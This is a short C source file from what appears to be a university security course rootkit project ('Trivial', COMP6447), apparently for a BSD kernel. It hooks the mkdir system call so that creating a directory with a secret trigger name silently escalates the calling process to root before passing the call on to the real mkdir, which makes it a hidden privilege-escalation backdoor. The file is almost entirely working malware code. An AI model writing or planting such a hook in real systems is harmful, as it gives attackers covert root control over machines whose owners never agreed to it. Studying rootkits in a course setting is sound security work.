/*
 * Trivial
 * COMP6447 19T2 Rootkit
 * Joshua Kwong & Hogan Richardson
 *
 * mkdir syscall hook
 *
 */

#include "trivial.h"

int
mkdir_hook(struct thread *td, void *syscall_args) 
{

	struct mkdir_args /* {
		char * path;
		int mode;
	} */ *uap;

	uap = (struct mkdir_args *)syscall_args;

	char path[255];
	size_t done;
	int error;

	error = copyinstr(uap->path, path, 255, &done);
	if (error)
		return (error);

	/* Do our magic */
	if (!strcmp(path, MKDIR_TRIGGER)) {
		/* Escalate to Root */
		escalate(td);
	}

	/* Actually perform the mkdir syscall */
	return (mkdir(td, syscall_args));
}
